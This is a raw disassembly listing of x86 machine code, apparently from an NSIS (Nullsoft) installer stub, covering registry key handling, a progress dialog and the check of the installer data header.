  402bd9:	e8 92 3d 00 00       	call   0x406970
  402bde:	6a 22                	push   $0x22
  402be0:	8b f0                	mov    %eax,%esi
  402be2:	e8 eb 01 00 00       	call   0x402dd2
  402be7:	3b f3                	cmp    %ebx,%esi
  402be9:	74 37                	je     0x402c22
  402beb:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  402bee:	51                   	push   %ecx
  402bef:	50                   	push   %eax
  402bf0:	ff 15 9c 82 40 00    	call   *0x40829c
  402bf6:	85 c0                	test   %eax,%eax
  402bf8:	7c 28                	jl     0x402c22
  402bfa:	8d 45 08             	lea    0x8(%ebp),%eax
  402bfd:	50                   	push   %eax
  402bfe:	53                   	push   %ebx
  402bff:	ff 75 dc             	push   -0x24(%ebp)
  402c02:	8d 45 a0             	lea    -0x60(%ebp),%eax
  402c05:	50                   	push   %eax
  402c06:	ff d6                	call   *%esi
  402c08:	85 c0                	test   %eax,%eax
  402c0a:	7c 16                	jl     0x402c22
  402c0c:	ff 75 08             	push   0x8(%ebp)
  402c0f:	ff 75 f4             	push   -0xc(%ebp)
  402c12:	e8 65 39 00 00       	call   0x40657c
  402c17:	ff 75 08             	push   0x8(%ebp)
  402c1a:	ff 15 a0 82 40 00    	call   *0x4082a0
  402c20:	eb 34                	jmp    0x402c56
  402c22:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402c25:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402c2c:	66 89 18             	mov    %bx,(%eax)
  402c2f:	eb 25                	jmp    0x402c56
  402c31:	8b 0d 08 4f 42 00    	mov    0x424f08,%ecx
  402c37:	53                   	push   %ebx
  402c38:	23 c8                	and    %eax,%ecx
  402c3a:	51                   	push   %ecx
  402c3b:	6a 0b                	push   $0xb
  402c3d:	ff 75 f8             	push   -0x8(%ebp)
  402c40:	ff 15 58 82 40 00    	call   *0x408258
  402c46:	39 5d d0             	cmp    %ebx,-0x30(%ebp)
  402c49:	74 0b                	je     0x402c56
  402c4b:	53                   	push   %ebx
  402c4c:	53                   	push   %ebx
  402c4d:	ff 75 f8             	push   -0x8(%ebp)
  402c50:	ff 15 54 82 40 00    	call   *0x408254
  402c56:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402c59:	01 05 a8 9a 42 00    	add    %eax,0x429aa8
  402c5f:	33 c0                	xor    %eax,%eax
  402c61:	5f                   	pop    %edi
  402c62:	5e                   	pop    %esi
  402c63:	5b                   	pop    %ebx
  402c64:	c9                   	leave
  402c65:	c2 04 00             	ret    $0x4
  402c68:	61                   	popa
  402c69:	2c 40                	sub    $0x40,%al
  402c6b:	00 91 14 40 00 9d    	add    %dl,-0x62ffbfec(%ecx)
  402c71:	14 40                	adc    $0x40,%al
  402c73:	00 b8 14 40 00 cb    	add    %bh,-0x34ffbfec(%eax)
  402c79:	14 40                	adc    $0x40,%al
  402c7b:	00 d7                	add    %dl,%bh
  402c7d:	14 40                	adc    $0x40,%al
  402c7f:	00 f5                	add    %dh,%ch
  402c81:	14 40                	adc    $0x40,%al
  402c83:	00 98 15 40 00 c8    	add    %bl,-0x37ffbfeb(%eax)
  402c89:	15 40 00 e6 15       	adc    $0x15e60040,%eax
  402c8e:	40                   	inc    %eax
  402c8f:	00 96 16 40 00 03    	add    %dl,0x3004016(%esi)
  402c95:	15 40 00 67 15       	adc    $0x15670040,%eax
  402c9a:	40                   	inc    %eax
  402c9b:	00 88 15 40 00 a7    	add    %cl,-0x58ffbfeb(%eax)
  402ca1:	16                   	push   %ss
  402ca2:	40                   	inc    %eax
  402ca3:	00 f8                	add    %bh,%al
  402ca5:	16                   	push   %ss
  402ca6:	40                   	inc    %eax
  402ca7:	00 61 17             	add    %ah,0x17(%ecx)
  402caa:	40                   	inc    %eax
  402cab:	00 88 17 40 00 9b    	add    %cl,-0x64ffbfe9(%eax)
  402cb1:	17                   	pop    %ss
  402cb2:	40                   	inc    %eax
  402cb3:	00 38                	add    %bh,(%eax)
  402cb5:	19 40 00             	sbb    %eax,0x0(%eax)
  402cb8:	3b 19                	cmp    (%ecx),%ebx
  402cba:	40                   	inc    %eax
  402cbb:	00 6d 19             	add    %ch,0x19(%ebp)
  402cbe:	40                   	inc    %eax
  402cbf:	00 82 19 40 00 94    	add    %al,-0x6bffbfe7(%edx)
  402cc5:	19 40 00             	sbb    %eax,0x0(%eax)
  402cc8:	2b 1a                	sub    (%edx),%ebx
  402cca:	40                   	inc    %eax
  402ccb:	00 5c 1a 40          	add    %bl,0x40(%edx,%ebx,1)
  402ccf:	00 9e 1a 40 00 de    	add    %bl,-0x21ffbfe6(%esi)
  402cd5:	1a 40 00             	sbb    0x0(%eax),%al
  402cd8:	a3 1b 40 00 c7       	mov    %eax,0xc700401b
  402cdd:	1b 40 00             	sbb    0x0(%eax),%eax
  402ce0:	6f                   	outsl  %ds:(%esi),(%dx)
  402ce1:	1c 40                	sbb    $0x40,%al
  402ce3:	00 6f 1c             	add    %ch,0x1c(%edi)
  402ce6:	40                   	inc    %eax
  402ce7:	00 43 1d             	add    %al,0x1d(%ebx)
  402cea:	40                   	inc    %eax
  402ceb:	00 64 1d 40          	add    %ah,0x40(%ebp,%ebx,1)
  402cef:	00 89 1d 40 00 ad    	add    %cl,-0x52ffbfe3(%ecx)
  402cf5:	1d 40 00 7a 1e       	sbb    $0x1e7a0040,%eax
  402cfa:	40                   	inc    %eax
  402cfb:	00 0a                	add    %cl,(%edx)
  402cfd:	1f                   	pop    %ds
  402cfe:	40                   	inc    %eax
  402cff:	00 3e                	add    %bh,(%esi)
  402d01:	1f                   	pop    %ds
  402d02:	40                   	inc    %eax
  402d03:	00 d0                	add    %dl,%al
  402d05:	1f                   	pop    %ds
  402d06:	40                   	inc    %eax
  402d07:	00 22                	add    %ah,(%edx)
  402d09:	20 40 00             	and    %al,0x0(%eax)
  402d0c:	56                   	push   %esi
  402d0d:	20 40 00             	and    %al,0x0(%eax)
  402d10:	03 21                	add    (%ecx),%esp
  402d12:	40                   	inc    %eax
  402d13:	00 d6                	add    %dl,%dh
  402d15:	21 40 00             	and    %eax,0x0(%eax)
  402d18:	2b 23                	sub    (%ebx),%esp
  402d1a:	40                   	inc    %eax
  402d1b:	00 af 23 40 00 de    	add    %ch,-0x21ffbfdd(%edi)
  402d21:	23 40 00             	and    0x0(%eax),%eax
  402d24:	20 24 40             	and    %ah,(%eax,%eax,2)
  402d27:	00 60 24             	add    %ah,0x24(%eax)
  402d2a:	40                   	inc    %eax
  402d2b:	00 b6 24 40 00 56    	add    %dh,0x56004024(%esi)
  402d31:	25 40 00 ca 25       	and    $0x25ca0040,%eax
  402d36:	40                   	inc    %eax
  402d37:	00 34 26             	add    %dh,(%esi,%eiz,1)
  402d3a:	40                   	inc    %eax
  402d3b:	00 48 26             	add    %cl,0x26(%eax)
  402d3e:	40                   	inc    %eax
  402d3f:	00 6a 26             	add    %ch,0x26(%edx)
  402d42:	40                   	inc    %eax
  402d43:	00 18                	add    %bl,(%eax)
  402d45:	27                   	daa
  402d46:	40                   	inc    %eax
  402d47:	00 bb 28 40 00 f0    	add    %bh,-0xfffbfd8(%ebx)
  402d4d:	28 40 00             	sub    %al,0x0(%eax)
  402d50:	0a 29                	or     (%ecx),%ch
  402d52:	40                   	inc    %eax
  402d53:	00 37                	add    %dh,(%edi)
  402d55:	29 40 00             	sub    %eax,0x0(%eax)
  402d58:	7c 29                	jl     0x402d83
  402d5a:	40                   	inc    %eax
  402d5b:	00 87 2a 40 00 17    	add    %al,0x1700402a(%edi)
  402d61:	2b 40 00             	sub    0x0(%eax),%eax
  402d64:	85 2b                	test   %ebp,(%ebx)
  402d66:	40                   	inc    %eax
  402d67:	00 56 2c             	add    %dl,0x2c(%esi)
  402d6a:	40                   	inc    %eax
  402d6b:	00 31                	add    %dh,(%ecx)
  402d6d:	2c 40                	sub    $0x40,%al
  402d6f:	00 6a 26             	add    %ch,0x26(%edx)
  402d72:	40                   	inc    %eax
  402d73:	00 18                	add    %bl,(%eax)
  402d75:	27                   	daa
  402d76:	40                   	inc    %eax
  402d77:	00 0e                	add    %cl,(%esi)
  402d79:	1b 40 00             	sbb    0x0(%eax),%eax
  402d7c:	15 1b 40 00 1c       	adc    $0x1c00401b,%eax
  402d81:	1b 40 00             	sbb    0x0(%eax),%eax
  402d84:	21 1b                	and    %ebx,(%ebx)
  402d86:	40                   	inc    %eax
  402d87:	00 31                	add    %dh,(%ecx)
  402d89:	1b 40 00             	sbb    0x0(%eax),%eax
  402d8c:	35 1b 40 00 39       	xor    $0x3900401b,%eax
  402d91:	1b 40 00             	sbb    0x0(%eax),%eax
  402d94:	42                   	inc    %edx
  402d95:	1b 40 00             	sbb    0x0(%eax),%eax
  402d98:	4b                   	dec    %ebx
  402d99:	1b 40 00             	sbb    0x0(%eax),%eax
  402d9c:	58                   	pop    %eax
  402d9d:	1b 40 00             	sbb    0x0(%eax),%eax
  402da0:	68 1b 40 00 86       	push   $0x8600401b
  402da5:	1b 40 00             	sbb    0x0(%eax),%eax
  402da8:	8d 1b                	lea    (%ebx),%ebx
  402daa:	40                   	inc    %eax
  402dab:	00 94 1b 40 00 8b 44 	add    %dl,0x448b0040(%ebx,%ebx,1)
  402db2:	24 04                	and    $0x4,%al
  402db4:	8b 0d 24 ce 40 00    	mov    0x40ce24,%ecx
  402dba:	56                   	push   %esi
  402dbb:	ff 34 81             	push   (%ecx,%eax,4)
  402dbe:	6a 00                	push   $0x0
  402dc0:	e8 f4 37 00 00       	call   0x4065b9
  402dc5:	8b f0                	mov    %eax,%esi
  402dc7:	56                   	push   %esi
  402dc8:	e8 0f 37 00 00       	call   0x4064dc
  402dcd:	0f b7 16             	movzwl (%esi),%edx
  402dd0:	5e                   	pop    %esi
  402dd1:	c3                   	ret
  402dd2:	56                   	push   %esi
  402dd3:	8b 74 24 08          	mov    0x8(%esp),%esi
  402dd7:	85 f6                	test   %esi,%esi
  402dd9:	57                   	push   %edi
  402dda:	8b c6                	mov    %esi,%eax
  402ddc:	7d 02                	jge    0x402de0
  402dde:	f7 d8                	neg    %eax
  402de0:	8b 15 24 ce 40 00    	mov    0x40ce24,%edx
  402de6:	8b c8                	mov    %eax,%ecx
  402de8:	83 e1 0f             	and    $0xf,%ecx
  402deb:	c1 f8 04             	sar    $0x4,%eax
  402dee:	ff 34 8a             	push   (%edx,%ecx,4)
  402df1:	c1 e0 0b             	shl    $0xb,%eax
  402df4:	05 c8 a5 40 00       	add    $0x40a5c8,%eax
  402df9:	50                   	push   %eax
  402dfa:	e8 ba 37 00 00       	call   0x4065b9
  402dff:	85 f6                	test   %esi,%esi
  402e01:	8b f8                	mov    %eax,%edi
  402e03:	7d 06                	jge    0x402e0b
  402e05:	57                   	push   %edi
  402e06:	e8 1f 3a 00 00       	call   0x40682a
  402e0b:	8b c7                	mov    %edi,%eax
  402e0d:	5f                   	pop    %edi
  402e0e:	5e                   	pop    %esi
  402e0f:	c2 04 00             	ret    $0x4
  402e12:	55                   	push   %ebp
  402e13:	8b ec                	mov    %esp,%ebp
  402e15:	8d 45 08             	lea    0x8(%ebp),%eax
  402e18:	50                   	push   %eax
  402e19:	8b 45 08             	mov    0x8(%ebp),%eax
  402e1c:	0d 20 00 10 00       	or     $0x100020,%eax
  402e21:	50                   	push   %eax
  402e22:	6a 22                	push   $0x22
  402e24:	e8 a9 ff ff ff       	call   0x402dd2
  402e29:	50                   	push   %eax
  402e2a:	a1 24 ce 40 00       	mov    0x40ce24,%eax
  402e2f:	ff 70 04             	push   0x4(%eax)
  402e32:	e8 13 00 00 00       	call   0x402e4a
  402e37:	50                   	push   %eax
  402e38:	e8 ac 35 00 00       	call   0x4063e9
  402e3d:	f7 d8                	neg    %eax
  402e3f:	1b c0                	sbb    %eax,%eax
  402e41:	f7 d0                	not    %eax
  402e43:	23 45 08             	and    0x8(%ebp),%eax
  402e46:	5d                   	pop    %ebp
  402e47:	c2 04 00             	ret    $0x4
  402e4a:	8b 44 24 04          	mov    0x4(%esp),%eax
  402e4e:	85 c0                	test   %eax,%eax
  402e50:	7c 0d                	jl     0x402e5f
  402e52:	8b 0d a4 9a 42 00    	mov    0x429aa4,%ecx
  402e58:	8d 84 01 01 00 00 80 	lea    -0x7fffffff(%ecx,%eax,1),%eax
  402e5f:	c2 04 00             	ret    $0x4
  402e62:	55                   	push   %ebp
  402e63:	8b ec                	mov    %esp,%ebp
  402e65:	8d 45 10             	lea    0x10(%ebp),%eax
  402e68:	50                   	push   %eax
  402e69:	8b 45 10             	mov    0x10(%ebp),%eax
  402e6c:	0d 20 00 10 00       	or     $0x100020,%eax
  402e71:	50                   	push   %eax
  402e72:	ff 75 0c             	push   0xc(%ebp)
  402e75:	ff 75 08             	push   0x8(%ebp)
  402e78:	e8 cd ff ff ff       	call   0x402e4a
  402e7d:	50                   	push   %eax
  402e7e:	e8 94 35 00 00       	call   0x406417
  402e83:	f7 d8                	neg    %eax
  402e85:	1b c0                	sbb    %eax,%eax
  402e87:	f7 d0                	not    %eax
  402e89:	23 45 10             	and    0x10(%ebp),%eax
  402e8c:	5d                   	pop    %ebp
  402e8d:	c2 0c 00             	ret    $0xc
  402e90:	55                   	push   %ebp
  402e91:	8b ec                	mov    %esp,%ebp
  402e93:	56                   	push   %esi
  402e94:	8b 75 0c             	mov    0xc(%ebp),%esi
  402e97:	66 83 3e 00          	cmpw   $0x0,(%esi)
  402e9b:	75 07                	jne    0x402ea4
  402e9d:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  402ea2:	eb 2c                	jmp    0x402ed0
  402ea4:	81 4d 10 20 00 10 00 	orl    $0x100020,0x10(%ebp)
  402eab:	8d 45 10             	lea    0x10(%ebp),%eax
  402eae:	50                   	push   %eax
  402eaf:	ff 75 08             	push   0x8(%ebp)
  402eb2:	e8 93 ff ff ff       	call   0x402e4a
  402eb7:	50                   	push   %eax
  402eb8:	e8 ab 34 00 00       	call   0x406368
  402ebd:	85 c0                	test   %eax,%eax
  402ebf:	74 0c                	je     0x402ecd
  402ec1:	ff 75 10             	push   0x10(%ebp)
  402ec4:	56                   	push   %esi
  402ec5:	50                   	push   %eax
  402ec6:	e8 0a 00 00 00       	call   0x402ed5
  402ecb:	eb 03                	jmp    0x402ed0
  402ecd:	6a 06                	push   $0x6
  402ecf:	58                   	pop    %eax
  402ed0:	5e                   	pop    %esi
  402ed1:	5d                   	pop    %ebp
  402ed2:	c2 0c 00             	ret    $0xc
  402ed5:	55                   	push   %ebp
  402ed6:	8b ec                	mov    %esp,%ebp
  402ed8:	81 ec 14 02 00 00    	sub    $0x214,%esp
  402ede:	53                   	push   %ebx
  402edf:	56                   	push   %esi
  402ee0:	8b 75 10             	mov    0x10(%ebp),%esi
  402ee3:	57                   	push   %edi
  402ee4:	8b fe                	mov    %esi,%edi
  402ee6:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402ee9:	81 e6 00 03 00 00    	and    $0x300,%esi
  402eef:	50                   	push   %eax
  402ef0:	8b c6                	mov    %esi,%eax
  402ef2:	83 e7 01             	and    $0x1,%edi
  402ef5:	0c 09                	or     $0x9,%al
  402ef7:	50                   	push   %eax
  402ef8:	ff 75 0c             	push   0xc(%ebp)
  402efb:	ff 75 08             	push   0x8(%ebp)
  402efe:	e8 e6 34 00 00       	call   0x4063e9
  402f03:	33 db                	xor    %ebx,%ebx
  402f05:	3b c3                	cmp    %ebx,%eax
  402f07:	0f 85 ab 00 00 00    	jne    0x402fb8
  402f0d:	f6 45 10 02          	testb  $0x2,0x10(%ebp)
  402f11:	74 23                	je     0x402f36
  402f13:	53                   	push   %ebx
  402f14:	53                   	push   %ebx
  402f15:	53                   	push   %ebx
  402f16:	8d 45 f8             	lea    -0x8(%ebp),%eax
  402f19:	53                   	push   %ebx
  402f1a:	50                   	push   %eax
  402f1b:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402f21:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  402f24:	50                   	push   %eax
  402f25:	53                   	push   %ebx
  402f26:	ff 75 fc             	push   -0x4(%ebp)
  402f29:	ff 15 00 80 40 00    	call   *0x408000
  402f2f:	3d 03 01 00 00       	cmp    $0x103,%eax
  402f34:	75 67                	jne    0x402f9d
  402f36:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402f3c:	68 05 01 00 00       	push   $0x105
  402f41:	50                   	push   %eax
  402f42:	53                   	push   %ebx
  402f43:	8b 1d 04 80 40 00    	mov    0x408004,%ebx
  402f49:	eb 27                	jmp    0x402f72
  402f4b:	85 ff                	test   %edi,%edi
  402f4d:	75 4e                	jne    0x402f9d
  402f4f:	ff 75 10             	push   0x10(%ebp)
  402f52:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402f58:	50                   	push   %eax
  402f59:	ff 75 fc             	push   -0x4(%ebp)
  402f5c:	e8 74 ff ff ff       	call   0x402ed5
  402f61:	85 c0                	test   %eax,%eax
  402f63:	75 16                	jne    0x402f7b
  402f65:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402f6b:	68 05 01 00 00       	push   $0x105
  402f70:	50                   	push   %eax
  402f71:	57                   	push   %edi
  402f72:	ff 75 fc             	push   -0x4(%ebp)
  402f75:	ff d3                	call   *%ebx
  402f77:	85 c0                	test   %eax,%eax
  402f79:	74 d0                	je     0x402f4b
  402f7b:	ff 75 fc             	push   -0x4(%ebp)
  402f7e:	ff 15 10 80 40 00    	call   *0x408010
  402f84:	6a 03                	push   $0x3
  402f86:	e8 e5 39 00 00       	call   0x406970
  402f8b:	85 c0                	test   %eax,%eax
  402f8d:	75 1e                	jne    0x402fad
  402f8f:	ff 75 0c             	push   0xc(%ebp)
  402f92:	ff 75 08             	push   0x8(%ebp)
  402f95:	ff 15 18 80 40 00    	call   *0x408018
  402f9b:	eb 1b                	jmp    0x402fb8
  402f9d:	ff 75 fc             	push   -0x4(%ebp)
  402fa0:	ff 15 10 80 40 00    	call   *0x408010
  402fa6:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  402fab:	eb 0b                	jmp    0x402fb8
  402fad:	6a 00                	push   $0x0
  402faf:	56                   	push   %esi
  402fb0:	ff 75 0c             	push   0xc(%ebp)
  402fb3:	ff 75 08             	push   0x8(%ebp)
  402fb6:	ff d0                	call   *%eax
  402fb8:	5f                   	pop    %edi
  402fb9:	5e                   	pop    %esi
  402fba:	5b                   	pop    %ebx
  402fbb:	c9                   	leave
  402fbc:	c2 0c 00             	ret    $0xc
  402fbf:	55                   	push   %ebp
  402fc0:	8b ec                	mov    %esp,%ebp
  402fc2:	81 ec 80 00 00 00    	sub    $0x80,%esp
  402fc8:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  402fcf:	75 19                	jne    0x402fea
  402fd1:	6a 00                	push   $0x0
  402fd3:	68 fa 00 00 00       	push   $0xfa
  402fd8:	6a 01                	push   $0x1
  402fda:	ff 75 08             	push   0x8(%ebp)
  402fdd:	ff 15 18 82 40 00    	call   *0x408218
  402fe3:	c7 45 0c 13 01 00 00 	movl   $0x113,0xc(%ebp)
  402fea:	81 7d 0c 13 01 00 00 	cmpl   $0x113,0xc(%ebp)
  402ff1:	75 4c                	jne    0x40303f
  402ff3:	8b 0d b8 ce 40 00    	mov    0x40ceb8,%ecx
  402ff9:	a1 c4 0e 42 00       	mov    0x420ec4,%eax
  402ffe:	3b c8                	cmp    %eax,%ecx
  403000:	72 02                	jb     0x403004
  403002:	8b c8                	mov    %eax,%ecx
  403004:	50                   	push   %eax
  403005:	6a 64                	push   $0x64
  403007:	51                   	push   %ecx
  403008:	ff 15 48 81 40 00    	call   *0x408148
  40300e:	50                   	push   %eax
  40300f:	8d 45 80             	lea    -0x80(%ebp),%eax
  403012:	68 1c a0 40 00       	push   $0x40a01c
  403017:	50                   	push   %eax
  403018:	ff 15 2c 82 40 00    	call   *0x40822c
  40301e:	83 c4 0c             	add    $0xc,%esp
  403021:	8d 45 80             	lea    -0x80(%ebp),%eax
  403024:	50                   	push   %eax
  403025:	ff 75 08             	push   0x8(%ebp)
  403028:	ff 15 1c 82 40 00    	call   *0x40821c
  40302e:	8d 45 80             	lea    -0x80(%ebp),%eax
  403031:	50                   	push   %eax
  403032:	68 06 04 00 00       	push   $0x406
  403037:	ff 75 08             	push   0x8(%ebp)
  40303a:	e8 7b 2b 00 00       	call   0x405bba
  40303f:	33 c0                	xor    %eax,%eax
  403041:	c9                   	leave
  403042:	c2 10 00             	ret    $0x10
  403045:	56                   	push   %esi
  403046:	33 f6                	xor    %esi,%esi
  403048:	39 74 24 08          	cmp    %esi,0x8(%esp)
  40304c:	74 18                	je     0x403066
  40304e:	a1 c0 0e 42 00       	mov    0x420ec0,%eax
  403053:	3b c6                	cmp    %esi,%eax
  403055:	74 07                	je     0x40305e
  403057:	50                   	push   %eax
  403058:	ff 15 10 82 40 00    	call   *0x408210
  40305e:	89 35 c0 0e 42 00    	mov    %esi,0x420ec0
  403064:	5e                   	pop    %esi
  403065:	c3                   	ret
  403066:	39 35 c0 0e 42 00    	cmp    %esi,0x420ec0
  40306c:	74 08                	je     0x403076
  40306e:	56                   	push   %esi
  40306f:	e8 38 39 00 00       	call   0x4069ac
  403074:	5e                   	pop    %esi
  403075:	c3                   	ret
  403076:	ff 15 d0 80 40 00    	call   *0x4080d0
  40307c:	3b 05 2c 9a 42 00    	cmp    0x429a2c,%eax
  403082:	76 23                	jbe    0x4030a7
  403084:	56                   	push   %esi
  403085:	68 bf 2f 40 00       	push   $0x402fbf
  40308a:	56                   	push   %esi
  40308b:	6a 6f                	push   $0x6f
  40308d:	ff 35 20 9a 42 00    	push   0x429a20
  403093:	ff 15 14 82 40 00    	call   *0x408214
  403099:	6a 05                	push   $0x5
  40309b:	50                   	push   %eax
  40309c:	a3 c0 0e 42 00       	mov    %eax,0x420ec0
  4030a1:	ff 15 28 82 40 00    	call   *0x408228
  4030a7:	5e                   	pop    %esi
  4030a8:	c3                   	ret
  4030a9:	55                   	push   %ebp
  4030aa:	8b ec                	mov    %esp,%ebp
  4030ac:	83 ec 28             	sub    $0x28,%esp
  4030af:	53                   	push   %ebx
  4030b0:	56                   	push   %esi
  4030b1:	57                   	push   %edi
  4030b2:	33 ff                	xor    %edi,%edi
  4030b4:	89 7d f4             	mov    %edi,-0xc(%ebp)
  4030b7:	89 7d f8             	mov    %edi,-0x8(%ebp)
  4030ba:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4030bd:	ff 15 d0 80 40 00    	call   *0x4080d0
  4030c3:	be 00 78 43 00       	mov    $0x437800,%esi
  4030c8:	68 00 04 00 00       	push   $0x400
  4030cd:	05 e8 03 00 00       	add    $0x3e8,%eax
  4030d2:	56                   	push   %esi
  4030d3:	57                   	push   %edi
  4030d4:	a3 2c 9a 42 00       	mov    %eax,0x429a2c
  4030d9:	ff 15 c4 80 40 00    	call   *0x4080c4
  4030df:	bf 00 00 00 80       	mov    $0x80000000,%edi
  4030e4:	eb 27                	jmp    0x40310d
  4030e6:	ff 15 c8 80 40 00    	call   *0x4080c8
  4030ec:	83 f8 20             	cmp    $0x20,%eax
  4030ef:	0f 85 1c 01 00 00    	jne    0x403211
  4030f5:	ff 45 fc             	incl   -0x4(%ebp)
  4030f8:	83 7d fc 06          	cmpl   $0x6,-0x4(%ebp)
  4030fc:	0f 87 0f 01 00 00    	ja     0x403211
  403102:	68 fa 00 00 00       	push   $0xfa
  403107:	ff 15 d4 80 40 00    	call   *0x4080d4
  40310d:	6a 03                	push   $0x3
  40310f:	57                   	push   %edi
  403110:	56                   	push   %esi
  403111:	e8 56 2f 00 00       	call   0x40606c
  403116:	8b d8                	mov    %eax,%ebx
  403118:	83 fb ff             	cmp    $0xffffffff,%ebx
  40311b:	89 1d 18 a0 40 00    	mov    %ebx,0x40a018
  403121:	74 c3                	je     0x4030e6
  403123:	56                   	push   %esi
  403124:	be 00 58 43 00       	mov    $0x435800,%esi
  403129:	56                   	push   %esi
  40312a:	e8 4d 34 00 00       	call   0x40657c
  40312f:	56                   	push   %esi
  403130:	e8 62 2d 00 00       	call   0x405e97
  403135:	50                   	push   %eax
  403136:	68 00 80 43 00       	push   $0x438000
  40313b:	e8 3c 34 00 00       	call   0x40657c
  403140:	6a 00                	push   $0x0
  403142:	53                   	push   %ebx
  403143:	ff 15 cc 80 40 00    	call   *0x4080cc
  403149:	85 c0                	test   %eax,%eax
  40314b:	a3 c4 0e 42 00       	mov    %eax,0x420ec4
  403150:	8b f0                	mov    %eax,%esi
  403152:	0f 86 f8 00 00 00    	jbe    0x403250
  403158:	a1 34 9a 42 00       	mov    0x429a34,%eax
  40315d:	8b fe                	mov    %esi,%edi
  40315f:	f7 d8                	neg    %eax
  403161:	1b c0                	sbb    %eax,%eax
  403163:	25 00 7e 00 00       	and    $0x7e00,%eax
  403168:	05 00 02 00 00       	add    $0x200,%eax
  40316d:	3b f0                	cmp    %eax,%esi
  40316f:	72 02                	jb     0x403173
  403171:	8b f8                	mov    %eax,%edi
  403173:	57                   	push   %edi
  403174:	68 c0 ce 40 00       	push   $0x40cec0
  403179:	e8 7b 03 00 00       	call   0x4034f9
  40317e:	85 c0                	test   %eax,%eax
  403180:	0f 84 36 01 00 00    	je     0x4032bc
  403186:	83 3d 34 9a 42 00 00 	cmpl   $0x0,0x429a34
  40318d:	0f 85 88 00 00 00    	jne    0x40321b
  403193:	6a 1c                	push   $0x1c
  403195:	8d 45 d8             	lea    -0x28(%ebp),%eax
  403198:	68 c0 ce 40 00       	push   $0x40cec0
  40319d:	50                   	push   %eax
  40319e:	e8 84 2e 00 00       	call   0x406027
  4031a3:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4031a6:	a9 f0 ff ff ff       	test   $0xfffffff0,%eax
  4031ab:	75 7c                	jne    0x403229
  4031ad:	81 7d dc ef be ad de 	cmpl   $0xdeadbeef,-0x24(%ebp)
  4031b4:	75 73                	jne    0x403229
  4031b6:	81 7d e8 49 6e 73 74 	cmpl   $0x74736e49,-0x18(%ebp)
  4031bd:	75 6a                	jne    0x403229
  4031bf:	81 7d e4 73 6f 66 74 	cmpl   $0x74666f73,-0x1c(%ebp)
  4031c6:	75 61                	jne    0x403229
  4031c8:	81 7d e0 4e 75 6c 6c 	cmpl   $0x6c6c754e,-0x20(%ebp)
  4031cf:	75 58                	jne    0x403229
  4031d1:	09 45 08             	or     %eax,0x8(%ebp)
  4031d4:	8b 45 08             	mov    0x8(%ebp),%eax
  4031d7:	8b 0d b8 ce 40 00    	mov    0x40ceb8,%ecx
  4031dd:	83 e0 02             	and    $0x2,%eax
  4031e0:	09 05 c0 9a 42 00    	or     %eax,0x429ac0
  4031e6:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4031e9:	3b c6                	cmp    %esi,%eax
  4031eb:	89 0d 34 9a 42 00    	mov    %ecx,0x429a34
  4031f1:	0f 87 be 00 00 00    	ja     0x4032b5
  4031f7:	f6 45 08 08          	testb  $0x8,0x8(%ebp)
  4031fb:	75 06                	jne    0x403203
  4031fd:	f6 45 08 04          	testb  $0x4,0x8(%ebp)
  403201:	75 4d                	jne    0x403250
  403203:	ff 45 f8             	incl   -0x8(%ebp)
  403206:	8d 70 fc             	lea    -0x4(%eax),%esi
  403209:	3b fe                	cmp    %esi,%edi
  40320b:	76 1c                	jbe    0x403229
  40320d:	8b fe                	mov    %esi,%edi
  40320f:	eb 18                	jmp    0x403229
  403211:	b8 e8 a1 40 00       	mov    $0x40a1e8,%eax
  403216:	e9 f2 00 00 00       	jmp    0x40330d
  40321b:	f6 45 08 02          	testb  $0x2,0x8(%ebp)
  40321f:	75 08                	jne    0x403229
  403221:	6a 00                	push   $0x0
  403223:	e8 1d fe ff ff       	call   0x403045
  403228:	59                   	pop    %ecx
  403229:	3b 35 c4 0e 42 00    	cmp    0x420ec4,%esi
  40322f:	73 11                	jae    0x403242
  403231:	57                   	push   %edi
  403232:	68 c0 ce 40 00       	push   $0x40cec0
  403237:	ff 75 f4             	push   -0xc(%ebp)
  40323a:	e8 1e 38 00 00       	call   0x406a5d
  40323f:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403242:	01 3d b8 ce 40 00    	add    %edi,0x40ceb8
  403248:	2b f7                	sub    %edi,%esi
  40324a:	0f 85 08 ff ff ff    	jne    0x403158
  403250:	6a 01                	push   $0x1
  403252:	e8 ee fd ff ff       	call   0x403045
  403257:	33 ff                	xor    %edi,%edi
  403259:	59                   	pop    %ecx
  40325a:	39 3d 34 9a 42 00    	cmp    %edi,0x429a34
  403260:	74 53                	je     0x4032b5
  403262:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  403265:	74 22                	je     0x403289
  403267:	ff 35 b8 ce 40 00    	push   0x40ceb8
  40326d:	e8 9d 02 00 00       	call   0x40350f
  403272:	8d 45 08             	lea    0x8(%ebp),%eax
  403275:	6a 04                	push   $0x4
  403277:	50                   	push   %eax
  403278:	e8 7c 02 00 00       	call   0x4034f9
  40327d:	85 c0                	test   %eax,%eax
  40327f:	74 34                	je     0x4032b5
  403281:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403284:	3b 45 08             	cmp    0x8(%ebp),%eax
  403287:	75 2c                	jne    0x4032b5
  403289:	ff 75 ec             	push   -0x14(%ebp)
  40328c:	6a 40                	push   $0x40
  40328e:	ff 15 10 81 40 00    	call   *0x408110
  403294:	8b f0                	mov    %eax,%esi
  403296:	a1 34 9a 42 00       	mov    0x429a34,%eax
  40329b:	83 c0 1c             	add    $0x1c,%eax
  40329e:	50                   	push   %eax
  40329f:	e8 6b 02 00 00       	call   0x40350f
  4032a4:	ff 75 ec             	push   -0x14(%ebp)
  4032a7:	56                   	push   %esi
  4032a8:	57                   	push   %edi
  4032a9:	6a ff                	push   $0xffffffff
